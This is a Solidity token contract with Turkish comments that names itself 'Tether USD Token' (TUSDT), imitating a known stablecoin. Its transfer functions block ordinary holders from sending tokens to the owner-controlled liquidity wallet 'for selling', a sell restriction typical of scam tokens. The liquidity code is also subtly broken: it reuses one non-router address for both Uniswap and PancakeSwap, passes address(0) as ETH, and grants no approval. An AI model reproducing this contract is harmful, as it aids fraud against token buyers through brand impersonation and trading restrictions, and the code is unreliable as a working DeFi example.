pragma solidity 0.5.8;

interface IUniswapV2Router02 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IPancakeRouter {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

contract TUSDT {
    string public name = "Tether USD Token";
    string public symbol = "TUSDT";
    uint8 public decimals = 6;  // Desimal sayısı 6
    uint256 public totalSupply = 1000000000 * (10 ** uint256(decimals));  // Toplam arz 1 milyar
    
    address public liquidityWallet = 0x396007C5c86916B9d2e9aC49B547106CE8520870;
    address public burnAddress = 0xD992465255ec12959d5bfABf0B5045f98f1Ae911;
    address public uniswapRouterAddress = 0x5C69bEe701ef814a2B6a3EDD5d7e7A27E8D9c7A0; // Uniswap Router adresi
    address public pancakeRouterAddress = 0x5C69bEe701ef814a2B6a3EDD5d7e7A27E8D9c7A0; // PancakeSwap Router adresi (değiştirilebilir)

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isLiquidityAddress;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    IUniswapV2Router02 public uniswapRouter;
    IPancakeRouter public pancakeRouter;

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        uniswapRouter = IUniswapV2Router02(uniswapRouterAddress);
        pancakeRouter = IPancakeRouter(pancakeRouterAddress);
    }

    modifier onlyOwner() {
        require(msg.sender == liquidityWallet, "Not authorized");
        _;
    }

    function addLiquidityAddress(address _address) public onlyOwner {
        isLiquidityAddress[_address] = true;
    }

    function removeLiquidityAddress(address _address) public onlyOwner {
        isLiquidityAddress[_address] = false;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        require(_to != address(0), "Invalid address");

        if (!isLiquidityAddress[msg.sender]) {
            require(_to != liquidityWallet, "Only liquidity wallet can receive for selling");
        }

        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _value, "Allowance exceeded");
        require(_to != address(0), "Invalid address");

        if (!isLiquidityAddress[_from]) {
            require(_to != liquidityWallet, "Only liquidity wallet can receive for selling");
        }

        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    // Uniswap ve PancakeSwap'a likidite ekleme fonksiyonu
    function addLiquidityUniswap(uint amountTokenDesired, uint amountETHDesired, uint amountTokenMin, uint amountETHMin, uint deadline) public onlyOwner returns (uint amountToken, uint amountETH, uint liquidity) {
        require(amountTokenDesired > 0 && amountETHDesired > 0, "Invalid amounts");

        // Token ve ETH'yi Uniswap'a ekler
        (amountToken, amountETH, liquidity) = uniswapRouter.addLiquidity(
            address(this),
            address(0), // ETH adresi
            amountTokenDesired,
            amountETHDesired,
            amountTokenMin,
            amountETHMin,
            liquidityWallet,
            deadline
        );
        return (amountToken, amountETH, liquidity);
    }

    // PancakeSwap'a likidite ekleme fonksiyonu
    function addLiquidityPancake(uint amountTokenDesired, uint amountETHDesired, uint amountTokenMin, uint amountETHMin, uint deadline) public onlyOwner returns (uint amountToken, uint amountETH, uint liquidity) {
        require(amountTokenDesired > 0 && amountETHDesired > 0, "Invalid amounts");

        // Token ve ETH'yi PancakeSwap'a ekler
        (amountToken, amountETH, liquidity) = pancakeRouter.addLiquidity(
            address(this),
            address(0), // ETH adresi
            amountTokenDesired,
            amountETHDesired,
            amountTokenMin,
            amountETHMin,
            liquidityWallet,
            deadline
        );
        return (amountToken, amountETH, liquidity);
    }
}
